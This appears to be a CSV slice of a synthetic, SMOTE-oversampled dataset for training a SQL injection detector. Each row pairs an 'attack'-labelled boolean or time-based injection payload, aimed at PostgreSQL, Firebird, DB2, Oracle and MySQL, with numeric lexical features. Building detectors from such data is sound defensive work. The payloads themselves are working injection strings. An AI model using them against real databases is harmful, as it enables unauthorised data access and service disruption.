id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000965,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000025,1.018307722286607,94.32448957449813,27.95280598406133,3.5669989557097597,29.696173164934923,13.0,39.20943880318774,12.418877606375467,0.3135001133344949,0.13799498526651566,0.4163649421994076,0.13213995919958182,1.6283164095632021,1.1102230246251565e-16,0.0,0.0,0.790561196812266,1.2094388031877341,0.0,6.790561196812266,0.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.7905611968122659,0.0,0.0,0.790561196812266,1.2094388031877341,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.790561196812266
SMOTE_000966,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""%""  =  """,nearest_attack_euclidean,R000022,3.7064337900705584,157.83956225358216,33.21842786566017,3.691452454226995,50.23034832075207,15.609213932830084,64.95393033584959,27.046069664150416,0.31389691409588444,0.0993005929182654,0.4155922147236357,0.1712102782622144,0.781572134339834,3.390786067169917,0.0,0.39078606716991704,0.0,1.390786067169917,0.0,13.218427865660166,1.390786067169917,1.218427865660166,2.827641798490249,4.218427865660166,0.390786067169917,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.609213932830083,0.0,0.0,0.0,0.0,1.390786067169917,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.8276417984902489,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.218427865660166
SMOTE_000967,attack,boolean,"1 where 3902  =  3902 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000005,0.13017634643148962,137.0432052352018,32.0,4.219788852520454,69.0,16.0,37.83456418816145,14.208641047040363,0.5035992302237732,0.11677663309536769,0.2759648589845375,0.10365927769632165,0.0,1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,4.208641047040364,0.0,0.0,2.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000968,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000025,2.458821585898826,85.38948458729504,26.106223069262285,3.6211474144069613,26.69474229364752,13.0,33.69474229364752,12.0,0.30943577609751133,0.15483343192077204,0.39280762405485015,0.1429231679268665,2.4468884653688585,1.1102230246251565e-16,0.0,0.0,0.5177038448770472,1.4822961551229528,0.0,5.553111534631142,0.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.5177038448770472,0.0,0.0,0.5177038448770472,1.4822961551229528,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.5177038448770475
SMOTE_000969,attack,boolean,"1'  )   where 4297  =  4297 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000018,1.6705088585652246,149.47123237673247,34.17658770486045,4.262433259759774,73.52976311458136,16.588293852430226,42.17658770486045,17.176587704860452,0.4918613140956253,0.11100655266868598,0.2823054906161572,0.1148266426195316,0.5882938524302259,0.4117061475697742,2.0,0.0,1.0,2.0,0.0,5.0,0.0,0.0,2.588293852430226,5.0,0.5882938524302259,0.41170614756977403,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.4117061475697742,0.5882938524302259,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000970,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'qjle'  =  'qjle",nearest_attack_euclidean,R000027,1.5227271822540231,120.22609595272098,29.281402215655692,4.172151095227839,72.48743911373772,4.537682658786828,29.15073063514732,14.050243545049106,0.6128945723525315,0.0357911679393991,0.23604405795114114,0.11527020175692831,2.4874391137377234,1.1102230246251565e-16,0.5125608862622766,0.0,1.0,1.0,0.0,3.2814022156556915,0.2562804431311383,0.0,2.2562804431311383,2.5125608862622766,1.0,0.0,0.2562804431311383,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.7437195568688617,0.2562804431311383,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000971,attack,boolean,"1""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""wvma"" like ""wvma",nearest_attack_euclidean,R000017,2.4003411163589017,83.65482459121978,22.432069141692953,3.3013857007185474,19.29620742507886,13.0,38.22275544952682,13.135861716614091,0.2349521878586606,0.15703701816366838,0.450571549556108,0.15743924442156304,1.7282765667718167,2.2717234332281833,0.0,0.0,0.5679308583070458,1.4320691416929543,0.0,6.271723433228183,0.0,0.4320691416929542,0.4320691416929543,2.0,0.4320691416929542,0.5679308583070458,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000972,attack,boolean,"1%""  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000007,1.2232277127541065,139.46495128678157,33.0,4.180914515320396,71.0,9.0,40.72079273898465,18.74415854779693,0.5099515474244649,0.06464174544817161,0.29106091318478255,0.13434579394258087,0.37207927389846507,0.627920726101535,2.0,0.0,1.0,1.0,0.0,5.74415854779693,1.0,0.0,3.0,4.0,0.37207927389846496,0.6279207261015349,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000973,attack,boolean,"1'+  (  select 'wkbg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",nearest_attack_euclidean,R000029,1.6118647189176556,138.61680753428084,35.922128310479444,4.045846152820075,53.19776221474321,19.652660388099303,47.57478869857874,18.19159623285958,0.38252786837367264,0.1421296266116945,0.343877580266002,0.13146492474863083,2.922128310479442,0.2694679223801396,0.538935844760279,0.0,1.0,2.0,0.0,7.191596232859581,0.0,0.7305320776198605,1.2694679223801395,5.0,0.7305320776198605,0.2694679223801395,0.2694679223801395,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.7305320776198605,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.730532077619861
SMOTE_000974,attack,boolean,"1""   )    )    as gawq where 4728  =  4728 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000010,1.1362081295654756,153.66801653518067,33.1015666552331,4.099332509688826,76.16018325901516,16.0,45.4062666209324,16.1015666552331,0.49522109922996327,0.1047099003389167,0.29518659901440325,0.1048824014167167,0.0,0.5507833276165502,2.0,0.0,1.0,2.0,0.0,5.55078332761655,0.0,0.0,2.0,5.0,0.0,0.5507833276165502,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000975,attack,boolean,"-4641""  )   where 4212  =  4212 or make_set  (  3595  =  4062,4062  )  --",nearest_attack_euclidean,R000009,2.6943442484568316,100.33142567760547,28.376645711096128,3.8414659637370043,24.694905699932573,24.0,35.0910133184486,16.545506659224298,0.23018407839172308,0.2654877275455787,0.3435934551402871,0.1607347389224111,0.0,1.0,2.6038923814839787,0.0,0.0,2.0,0.0,5.772753329612149,0.0,1.3961076185160213,1.0,6.980538092580106,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.3961076185160213,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000976,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000025,1.6681521429445856,100.67534488467261,28.688310341021825,3.7976394642378484,44.77927601810513,9.883103410218261,34.012965456349214,12.0,0.4344218713803087,0.10163273685062021,0.34421041979235106,0.11973497197672003,1.623379317956348,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,5.44155170510913,0.0,0.688310341021826,1.3116896589781741,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000977,attack,boolean,"1'  )   where 4297  =  4297 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000018,1.366225266937526,158.13772536389246,34.586227463610754,4.211842149244474,78.48263521833547,16.586227463610754,45.48263521833548,17.586227463610754,0.4961933281583717,0.10508147363833878,0.28731404945265626,0.11141114875063318,0.5862274636107534,0.4137725363892466,2.0,0.0,1.0,2.0,0.0,5.413772536389247,0.0,0.0,2.5862274636107534,5.0,0.5862274636107534,0.41377253638924666,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000978,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000025,1.3591381645939622,90.13493173879547,27.400435928762402,3.617970870395314,29.06746586939774,13.0,36.067465869397736,12.0,0.32012372013242224,0.1461494773924069,0.3988195925744875,0.1349072099006833,1.7997820356187981,1.1102230246251565e-16,0.0,0.0,0.7334059881270671,1.2665940118729329,0.0,6.200217964381202,0.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.7334059881270671,0.0,0.0,0.7334059881270671,1.2665940118729326,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.733405988127067
SMOTE_000979,attack,boolean,select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000001,0.2397373697506654,67.9093193505451,24.335690694293667,3.484356455456927,25.715752437500957,4.447587592391555,27.522185524456813,10.223793796195778,0.3737170784318967,0.06341645143660793,0.4105853078671302,0.1522811622643652,0.0,0.03729896603262961,2.0,0.0,1.0,2.0,0.0,2.1118968980978883,0.0,0.0,0.074597932065259,5.96270103396737,0.0,0.0372989660326295,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.03729896603262961,0.9627010339673705,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000980,attack,boolean,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",nearest_attack_euclidean,R000028,1.1557211303623824,137.81497206886385,31.29519551795307,4.025976320637598,69.81921792818773,10.405363104769986,39.40536310476999,18.18502793113615,0.5063963381426593,0.07560670326390284,0.28603544599123537,0.13196151260220246,4.0,1.1102230246251565e-16,0.0,0.0,1.0,2.0,0.0,4.740111724544612,1.6299441377276942,0.1850279311361528,1.8149720688638473,3.370055862272306,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.185027931136153,0.0,0.18502793113615282,1.0,1.814972068863847,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.185027931136153
SMOTE_000981,attack,boolean,"1'  )   where 4297  =  4297 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000018,0.47644380276446324,153.1558670829445,34.758819166555575,4.28562400878655,75.39704791638894,16.0352766662223,43.48236166688885,18.241180833444425,0.4922386907332853,0.10446076800901921,0.2841055487293166,0.11919499252837884,1.0,1.1102230246251565e-16,2.0,0.0,1.0,1.8794095832777873,0.0,5.241180833444425,0.12059041672221274,0.0,3.0,4.879409583277787,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.8794095832777875,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.8794095832777873
SMOTE_000982,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000014,0.23939715607934348,74.66256775762756,22.96102542602191,3.6063043683480474,20.883076278065726,13.0,28.701542331605637,12.077949147956183,0.28043268810019084,0.17439658734048738,0.3833326752784743,0.1618380492808475,3.8441017040876364,0.1558982959123637,0.0,0.0,0.03897457397809084,1.961025426021909,0.0,4.155898295912364,0.0,0.9610254260219091,0.9610254260219091,2.0,0.9610254260219091,0.0389745739780909,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000983,attack,boolean,"1""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""wvma"" like ""wvma",nearest_attack_euclidean,R000017,0.719316985354974,87.31294995355634,23.724436879916304,3.345478894739331,21.104729485355577,13.310472948535558,39.44887375983261,13.448873759832605,0.23420709347502933,0.155545119060611,0.4584825835777516,0.15176520388660794,0.0,4.0,0.0,0.0,0.896509017154814,1.103490982845186,0.0,6.413963931380744,0.0,0.20698196569037186,0.10349098284518621,2.620945897071117,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.10349098284518594,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000984,attack,boolean," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",nearest_attack_euclidean,R000003,3.8426935312687776,77.72855711906335,22.454759519843893,3.3396525383902875,17.45475951984389,13.545240480156108,33.63807615875114,13.090480960312217,0.22464551324513823,0.17476431873988826,0.43144016433488636,0.16915000368008712,0.0,1.8190380793755685,0.0,0.0,0.4547595198438922,1.0,0.0,5.454759519843892,0.0,0.5452404801561078,2.1809619206244317,1.454759519843892,0.0,0.45475951984389207,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.454759519843892,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5452404801561079,0.5452404801561077,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.545240480156108
SMOTE_000985,attack,boolean,"1  )   where 5333  =  5333 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000030,1.2151574771358427,140.20989984302696,32.987625196216314,4.109299419736438,64.65444913664822,16.98762519621631,42.77772535318936,15.790100156973049,0.46046457726865153,0.12133854921458138,0.3054332132958324,0.1127636602209347,0.7901001569730488,1.1102230246251565e-16,1.6049499215134757,0.0,1.0,2.0,0.0,5.592575117729786,0.0,0.1975250392432622,1.8024749607567379,5.0,0.1975250392432622,0.0,0.8024749607567379,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.1975250392432621,0.0,1.0,1.0,0.19752503924326215,0.8024749607567379,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.197525039243262
SMOTE_000986,attack,boolean,"1""   )    )    as gawq where 4728  =  4728 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000010,0.6999115745954244,157.63543119664075,33.4465592344905,4.087235322956201,78.40263502418826,16.0,46.786236937962,16.4465592344905,0.4970561661409069,0.10196475959409046,0.2965666290084056,0.10441244525659701,0.0,0.7232796172452504,2.0,0.0,1.0,2.0,0.0,5.72327961724525,0.0,0.0,2.0,5.0,0.0,0.7232796172452503,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000987,attack,boolean,"-4641""  )   where 4212  =  4212 or make_set  (  3595  =  4062,4062  )  --",nearest_attack_euclidean,R000009,1.1726464419893239,71.79933120501944,25.69983280125486,3.761728323843574,15.500835993725694,20.9983280125486,24.45025079811771,10.849916400627428,0.21841314871901032,0.28866048387683485,0.34176698827020574,0.1511593791339491,0.0,0.84991640062743,2.8499164006274302,0.0,0.15008359937257,2.0,0.0,2.8499164006274302,0.0,0.84991640062743,0.84991640062743,5.15008359937257,0.0,0.84991640062743,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.15008359937257,0.0,1.0,0.15008359937257,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.30016719874514
SMOTE_000988,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000021,1.081334912715856,148.91584062776866,33.54738303650533,4.145655139764954,72.36845759126334,11.189532146021326,45.90523392698934,19.45261696349467,0.4858705972852785,0.07468056629628134,0.30864143819075474,0.13080739822768545,1.0,1.1102230246251565e-16,2.0,0.0,1.0,1.273691518252666,0.0,6.452616963494668,0.726308481747334,0.0,3.0,4.273691518252666,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.27369151825266586,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.273691518252666
SMOTE_000989,attack,boolean,"1' in boolean mode  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  #",nearest_attack_euclidean,R000008,0.6742511327065921,149.72039987345232,31.186400084365125,4.172835810272049,83.69519940944413,9.0,40.652400295277936,16.372800168730247,0.5588682957901665,0.06011412250063171,0.27161197502737405,0.10940560668182768,1.0,1.1102230246251565e-16,0.186400084365124,0.0,1.0,1.0,0.0,5.186400084365124,0.09320004218256206,0.0,3.0,2.186400084365124,1.0,0.0,0.093200042182562,0.9067999578174378,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.9067999578174379,0.09320004218256206,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000990,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'qjle'  =  'qjle",nearest_attack_euclidean,R000027,2.9472695344576016,128.73049276206518,29.363884058620396,4.193552636112269,78.4555362344816,5.727768117240795,30.728676332182253,13.81851207816053,0.6162906036274294,0.04201746442808005,0.23423914350418806,0.10745278844030252,2.0907439609197347,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,3.3638840586203975,0.0,0.0,2.4546280195401327,2.0,1.0,0.0,0.0,0.45462801954013254,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000991,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   ""vfvh""  =  ""vfvh",nearest_attack_euclidean,R000024,2.4990166630513713,133.56198096364318,32.23810180721062,3.7738770982639247,49.48574975893734,11.05713891567363,51.952407228842475,21.06668506018973,0.3655741738380278,0.08977134627822693,0.39126852248287297,0.1533859574008723,0.35237963855787635,1.942861084326371,0.0,0.0,0.3523796385578763,1.0,0.0,10.238101807210619,0.0,1.6476203614421236,1.0,5.238101807210619,0.3523796385578763,0.6476203614421236,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.6476203614421236,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000992,attack,boolean,"1 where 3902  =  3902 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000005,0.05354724305045318,136.1215270158387,32.01104791053079,4.239607119694504,69.02209582106158,15.922664626284476,37.110479105307896,14.066287463184736,0.5070838169053373,0.11702370732899509,0.27258546712364157,0.10330700864202592,0.01104791053078924,1.1102230246251565e-16,2.0,0.0,1.0,1.9889520894692105,0.0,4.033143731592368,0.01104791053078924,0.0,2.011047910530789,4.988952089469211,0.01104791053078924,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.9889520894692108,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.988952089469211
SMOTE_000993,attack,boolean,"1""   )    )    as gawq where 4728  =  4728 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000010,2.8000497434087928,155.5666136572712,33.23332851429738,3.9962118815244554,66.28323454309634,19.06668594281047,50.150007228553925,20.06668594281047,0.4190135754539489,0.12495150618793274,0.32462371677587404,0.13141120158224434,0.0,1.0,2.0,0.0,0.6166642571486912,2.0,0.0,7.533342971405235,0.0,0.7666714857026175,1.6166642571486913,6.916678714256543,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.3833357428513086,0.6166642571486913,0.0,1.0,0.6166642571486912,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.2333285142973827
